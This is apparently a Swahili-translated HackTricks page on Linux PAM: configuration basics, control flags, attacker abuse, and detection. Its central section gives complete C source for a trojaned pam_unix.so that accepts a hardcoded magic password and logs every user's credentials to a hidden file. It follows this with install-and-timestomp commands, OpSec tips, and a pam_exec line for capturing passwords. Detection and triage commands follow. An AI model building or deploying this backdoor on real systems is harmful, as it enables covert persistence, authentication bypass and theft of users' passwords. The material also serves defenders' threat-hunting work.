# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Taarifa za Msingi

**PAM (Pluggable Authentication Modules)** ni utaratibu wa usalama **unaothibitisha utambulisho wa watumiaji wanaojaribu kufikia huduma za kompyuta**, na kudhibiti ufikiaji wao kulingana na vigezo mbalimbali. Ni kama mlinzi wa kidijitali, anayehakikisha kuwa watumiaji walioidhinishwa pekee ndio wanaoweza kutumia huduma maalum, huku ikiwezekana ikizuia matumizi yao ili kuzuia mfumo kulemewa.

#### Faili za Usanidi

- **Solaris** inasaidia faili kuu ya zamani `/etc/pam.conf`, lakini mwongozo wa sasa unapendelea faili za huduma zilizo chini ya `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Mifumo ya Linux** hupendelea kutumia saraka, na kuhifadhi usanidi maalum wa kila huduma ndani ya `/etc/pam.d`. Kwa mfano, faili ya usanidi wa huduma ya login inapatikana kwenye `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Mfano wa usanidi wa PAM kwa huduma ya login unaweza kuonekana hivi:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **Maeneo ya Usimamizi wa PAM**

Maeneo haya, au vikundi vya usimamizi, vinajumuisha **auth**, **account**, **password**, na **session**, kila kimoja kikihusika na vipengele tofauti vya mchakato wa uthibitishaji na usimamizi wa session:<sup>[[1]](#references)</sup>

- **Auth**: Huthibitisha utambulisho wa mtumiaji, mara nyingi kwa kumwomba aweke password.
- **Account**: Hushughulikia uthibitishaji wa akaunti, kwa kuangalia masharti kama uanachama wa group au vizuizi vya muda wa siku.
- **Password**: Hudhibiti masasisho ya password, ikijumuisha ukaguzi wa ugumu au kuzuia mashambulizi ya kamusi.
- **Session**: Hudhibiti vitendo wakati session ya huduma inaanza au inaisha, kama vile kupachika directories au kuweka vikomo vya rasilimali.

#### **Vidhibiti vya Module za PAM**

Vidhibiti huamua jinsi module inavyoitikia mafanikio au kushindwa, na kuathiri mchakato mzima wa uthibitishaji. Vinajumuisha:<sup>[[1]](#references)</sup>

- **Required**: Module ya lazima ikishindwa, hatimaye mchakato hushindwa, lakini baada tu ya kukagua modules zote zinazofuata.
- **Requisite**: Mchakato hukoma mara moja module ikishindwa.
- **Sufficient**: Ikiwa hakuna module ya awali ya `required` iliyoshindwa, mafanikio hurudishwa mara moja na modules zilizosalia katika kundi hilohilo la usimamizi hurukwa.
- **Optional**: Husababisha kushindwa tu ikiwa ndiyo module pekee kwenye stack.

#### Semantiki za Kiofensi Zenye Umuhimu

Wakati wa kuchambua au kurekebisha PAM, **mahali pa sheria iliyoingizwa** huamua stack gani itakayoitumia:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` na `substack` huingiza sheria kutoka kwa files nyingine. Kwa hiyo, kuhariri `sshd` kunaweza kuathiri SSH pekee, ilhali kuhariri `system-auth`, `common-auth`, au stack nyingine inayoshirikiwa huathiri huduma kadhaa kwa wakati mmoja.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM pia hutumia vidhibiti vilivyowekwa kwenye mabano kama `[success=1 default=ignore]`. Hivi vinaweza kutumiwa vibaya **kuruka module moja au zaidi** baada ya ukaguzi maalum kufanikiwa, badala ya kubadilisha `pam_unix.so` kwa njia inayoonekana.<sup>[[1]](#references)</sup>
- `module-path` inaweza kuwa **absolute** (`/usr/lib/security/pam_custom.so`) au **relative** na directory chaguomsingi ya PAM modules. Kwenye mifumo ya kisasa ya Linux, directories halisi mara nyingi ni `/lib/security`, `/lib64/security`, `/usr/lib/security`, au njia za multiarch kama `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Jambo la haraka kwa operator: chora **grafu nzima ya huduma** kabla ya kufanya patch. Kwa mfano, `sshd -> password-auth -> system-auth` kwenye baadhi ya distros, au `sshd -> system-remote-login -> system-login -> system-auth` kwenye nyingine, inamaanisha kuwa implant ileile ya mstari mmoja inaweza kuenea zaidi sana kuliko ilivyokusudiwa.<sup>[[1]](#references)[[13]](#references)</sup>

Module maalum ya `auth` inaweza kuongeza changamoto ya maingiliano kwenye `sudo` baada ya password ya akaunti. Kagua stack inayotumika ya `/etc/pam.d/sudo`, policy iliyojumuishwa, arguments za module, na permissions za data file yoyote ya ndani inayorejelewa kabla ya kukagua changamoto hiyo mwenyewe. Orodha ya maneno ya changamoto inayosomeka peke yake haikwepi ukaguzi wa password wala kutoa ruhusa ya sudoers. Mpito wenye ruhusa za juu bado unahitaji uthibitishaji sahihi wa akaunti, kukamilishwa kwa hatua zote za lazima za PAM, na sheria ya sudo inayoruhusu root; enumeration isiyosimamiwa na mtumiaji haipaswi kuanzisha changamoto hiyo.

Kwa hitilafu ya zamani ya umiliki ya Ubuntu [`pam_motd` (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832), kagua build halisi ya `libpam-modules` na kama huduma ya login inaita session module iliyoathiriwa. Ubuntu iliirekebisha katika **1.1.0-2ubuntu1.1** kwa 9.10 na **1.1.1-2ubuntu5** kwa 10.04 LTS; releases nyingine au backports za vendor zinahitaji tathmini yao ya package. Njia iliyoripotiwa ilihitaji mpigaji kubadilisha `.cache` ya home yake na kuweka symlink, kisha kuanzisha login ya PAM, na kusababisha module ya zamani kubadilisha umiliki wa target iliyolindwa. Kuwepo kwa `.cache`, mstari wa `pam_motd.so`, au toleo la zamani la kernel pekee hakuthibitishi kuwepo kwa hatari; kagua udhibiti wa home directory, toleo halisi la module, uwezekano wa kufikiwa kupitia login, ushughulikiaji wa symlink, na permissions za target bila kubadilisha files au kuanzisha login wakati wa enumeration tulivu. Angalia [taarifa ya usalama ya Ubuntu](https://ubuntu.com/security/notices/USN-959-1).

#### Mfano wa Hali

Katika usanidi wenye modules nyingi za auth, mchakato hufuata mpangilio mkali. Module ya `pam_securetty` ikigundua kuwa terminal ya login hairuhusiwi, logins za root huzuiwa, lakini modules zote bado huchakatwa kwa sababu ya hali yake ya "required". `pam_env` huweka environment variables, jambo linaloweza kuboresha matumizi ya mtumiaji. Modules za `pam_ldap` na `pam_unix` hufanya kazi pamoja kumthibitisha mtumiaji, huku `pam_unix` ikijaribu kutumia password iliyotolewa awali, hivyo kuongeza ufanisi na unyumbufu wa mbinu za uthibitishaji.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` katika stack ya huduma

`pam_permit.so` hurudisha mafanikio kwa ukaguzi wa PAM. Ikiwa mtumiaji mwenye ruhusa za chini anaweza kurekebisha policy ya PAM inayotumika na huduma, kuiingiza pamoja na control flag inayokatiza stack ya uthibitishaji kunaweza kuondoa ukaguzi wa password kwa huduma hiyo. Kwa `sudo`, kagua `/etc/pam.d/sudo` na file yoyote ya `common-auth` au `system-auth` iliyojumuishwa kabla ya kuamua ni huduma zipi zimeathiriwa. Bypass ya uthibitishaji wa PAM **haitoi** sheria mpya ya sudoers; mtumiaji bado lazima awe na ruhusa ya kutekeleza amri iliyoombwa. Kagua mpangilio wa sheria na kushindwa kokote kwa `required` iliyotangulia badala ya kudhani kuwa mstari mmoja wa `sufficient pam_permit.so` hufanikiwa kila wakati.

## Kuweka Backdoor kwenye PAM – Ku-hook `pam_unix.so`

Ujanja wa kawaida wa persistence katika mazingira muhimu ya Linux ni **kubadilisha PAM library halali na toleo la drop-in lililowekewa trojan**. Kwenye host ambayo PAM stack yake hupakia `pam_unix.so`, uthibitishaji wa SSH au console unaweza kuita entry point yake ya `pam_sm_authenticate()`; mbadala hasidi unaweza kunasa credentials au kutekeleza bypass ya password ya *magic*.<sup>[[2]](#references)[[11]](#references)</sup>

### Muhtasari wa Uundaji
Mchoro ulio hapa chini hutumia service entry point ya Linux-PAM `pam_sm_authenticate()` na `pam_get_authtok()` kufikia token ya uthibitishaji.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Trojan ya mfano ya `pam_unix.so`</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Compile na ubadilishe kwa siri (muundo wa replacement/timestomp umeandikwa na Unit 42). Rekebisha path ya backup iliyowekwa moja kwa moja kwenye wrapper na amri zilizo hapa chini ili zilingane na saraka halisi ya PAM module ya target:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### Vidokezo vya OpSec
1. **Uandishi upya wa atomiki** – andika library kamili kwenye faili ya muda kisha uipeleke mahali pake kwa kuibadilisha, ili kuepuka kuacha authentication module ikiwa imeandikwa kwa sehemu tu.
2. Njia kama `/usr/bin/.dbus.log` ilionekana katika uchanganuzi wa AuthDoor wa Unit 42, kwa hiyo pia ni kiashiria muhimu cha hunting.<sup>[[2]](#references)</sup>
3. Hifadhi entry points zinazotarajiwa na PAM stack (kwa mfano, `pam_sm_authenticate` na `pam_sm_setcred`) ili shughuli nyingine za usimamizi ziendelee kufanya kazi.<sup>[[11]](#references)[[18]](#references)</sup>

### Utambuzi
Kwa ukaguzi wa uadilifu wa package, RPM huthibitisha metadata ya faili zilizosakinishwa, `debsums -s` huripoti hitilafu za checksum, na `dpkg -S` katika triage block hukagua umiliki wa package; sintaksia ya audit watch hurekodi uandishi na mabadiliko ya sifa za njia.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Linganisha MD5/SHA256 ya `pam_unix.so` na package ya distro.
* Tumia `rpm -V pam` au `debsums -s libpam-modules` kutambua library zilizobadilishwa bila kuhesabu hash kwa mkono.
* Kagua kama kuna ruhusa ya kuandika kwa kila mtu au umiliki usio wa kawaida chini ya `/lib/security/`.
* Kanuni ya `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Tafuta kwenye usanidi wa PAM moduli zisizotarajiwa: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Utafutaji huo wa `pam_` hukosa custom modules zenye majina mengine ya msingi ya `.so`. Kagua mistari **inayotumika** ya `auth`, `account`, `password`, na `session` kwenye `/etc/pam.d` (na `/etc/pam.conf` pale inapotumika), ikijumuisha control flag zake na stack yoyote iliyojumuishwa. Module usiyoifahamu iliyowekwa kama `auth sufficient` kabla ya ukaguzi wa kawaida wa password inafaa kuchunguzwa umiliki wake wa package na binary yake; [sintaksia ya control ya PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html) inaweza kufanya mafanikio yakatishe sehemu hiyo ya stack mapema. Jina la module, timestamp isiyo ya kawaida, au chaguo la `nodelay` pekee havithibitishi bypass. Ikiwa tabia inaashiria timing leak, kagua kwanza utekelezaji na ufikikaji wa service; uorodheshaji wa kawaida haupaswi kuwasilisha makisio ya authentication mara kwa mara.

### Amri za triage ya haraka (baada ya compromise au kwa threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Kutumia vibaya `pam_exec` kwa persistence
Badala ya kubadilisha `pam_unix.so`, njia isiyoingilia sana ni kuongeza mstari wa `pam_exec` katika `/etc/pam.d/sshd` ili invocation inayofika kwenye mstari huo wa PAM iendeshe helper huku stack ya kawaida ikiendelea kufanya kazi.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` hupokea metadata za PAM katika environment variables kama vile `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, na `PAM_TYPE`. Kwa `expose_authtok`, helper inaweza kusoma hadi `PAM_MAX_RESP_SIZE` bytes za password kutoka `stdin` katika awamu za `auth` au `password`. Ikiwa unataka helper iendeshwe kwa effective UID badala ya real UID, ongeza `seteuid`.<sup>[[4]](#references)</sup>

Vidokezo vya vitendo vinafuata aina za module na kichujio cha `type=` kilichoandikwa kwa `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` inafaa zaidi kwa **vitendo vya baada ya kuingia** kama vile kufungua upya sockets au kuanzisha daemon iliyojitenga.
- `auth optional pam_exec.so quiet expose_authtok ...` ndiyo chaguo la kawaida kwa **kunasa credentials** kwa sababu huendeshwa kabla ya session kufunguliwa.
- `type=session` au `type=auth` inaweza kutumika kuweka utekelezaji kwenye awamu mahususi ya PAM na kuepuka utekelezaji rudufu usiohitajika.

Kwa ukaguzi wa privilege, njia kamili ya helper ya `pam_exec.so` ambayo mtumiaji wa sasa anaweza kuiandika ni mgombea hata faili ikiwa na alama ya append-only (`a`): [attribute hii huruhusu kuongeza maudhui](https://man7.org/linux/man-pages/man1/chattr.1.html), jambo ambalo linaweza kutosha kubadilisha tabia ya baadaye ya shell script. Kwanza thibitisha kuwa PAM service na tukio husika hufika kwenye mstari huo, helper na njia yake ya mzazi zinaaminika, na amri huendeshwa chini ya utambulisho wenye privilege zaidi; [`seteuid` hubadilisha PAM UID inayotumika](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Faili inayoweza kuandikwa au matokeo ya `lsattr` pekee hayathibitishi utekelezaji wenye privilege.

### Kudumu dhidi ya zana za distro: `authselect`

Kwenye mifumo ya familia ya RHEL na Fedora inayotumia `authselect`, mabadiliko ya moja kwa moja kwenye faili zinazozalishwa kama vile `/etc/pam.d/system-auth` au `/etc/pam.d/password-auth` yanaweza **kubatilishwa na `authselect`**. Ili mabadiliko yadumu, waendeshaji mara nyingi hurekebisha profile maalum inayotumika chini ya `/etc/authselect/custom/<profile>/` kisha kuichagua tena.<sup>[[5]](#references)[[19]](#references)</sup>

Mtiririko wa kawaida wa kazi ukiwa na root:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Hili ni muhimu kwa offense na triage: ikiwa `/etc/pam.d/system-auth` ina mabango `Generated by authselect` na `Do not modify this file manually`, basi sehemu halisi ya persistence huenda ikawa chini ya `/etc/authselect/custom/` badala ya `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Mbinu za hivi karibuni zilizoonekana porini

Ripoti za hivi karibuni za 2025 kuhusu backdoor ya Linux ya **Plague** zilionyesha wazo hilohilo la msingi likiendelezwa zaidi: sehemu hasidi ya PAM yenye **nenosiri tuli la bypass**, pamoja na kufuta vigezo vya mazingira vinavyohusiana na SSH na historia ya shell (`HISTFILE=/dev/null`) ili kupunguza athari za session baada ya kuingia.<sup>[[3]](#references)</sup> Huu ni muundo muhimu wa kutafuta kwa sababu mantiki ya backdoor inaweza kuwa kwenye PAM huku alama za kujificha zikionekana tu **baada ya** uthibitishaji kufanikiwa.


## References

- [1] [pam.conf(5) / pam.d(5) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Kitabu cha Mbinu za Opereta Fiche: Kupenya Mitandao ya Mawasiliano ya Kimataifa - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Backdoor Mpya ya Linux Iliyogunduliwa Inayotegemea PAM](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Kusanidi uthibitishaji wa mtumiaji kwa kutumia authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Kurasa za Mwongozo za Debian](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Kurasa za Mwongozo za Debian](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Kudhibiti Uthibitishaji katika Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Mwongozo wa Uthibitishaji wa Kiwango cha Mfumo - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Orodha ya faili za kifurushi cha Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Kurasa za Mwongozo za Debian](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Mabadiliko/Kufanya Authselect kuwa Lazima - Wiki ya Fedora Project](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
